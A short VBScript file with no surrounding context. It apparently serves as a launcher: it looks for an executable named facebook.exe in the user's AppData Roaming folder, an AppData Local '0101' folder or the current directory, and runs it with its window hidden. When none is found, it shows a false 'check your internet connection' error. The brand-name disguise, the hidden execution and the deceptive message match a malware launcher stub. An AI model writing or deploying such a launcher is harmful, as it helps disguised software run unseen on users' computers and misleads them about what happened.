Dim FSO
Set WshShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")


User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Loc1 = "C:\Users\"+ User + "\AppData\Roaming\facebook.exe"
Loc2 = "C:\Users\"+ User + "\AppData\Local\0101\facebook.exe"
Loc3 = ".\facebook.exe"
Currnt = "C:\Users\"+ User + "\AppData\Roaming"

If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Roaming\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\0101\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\facebook.exe" & Chr(34), 0
   Set WshShell = Nothing 

Else
   MsgBox "Please check your internet connection and try again!"

End If






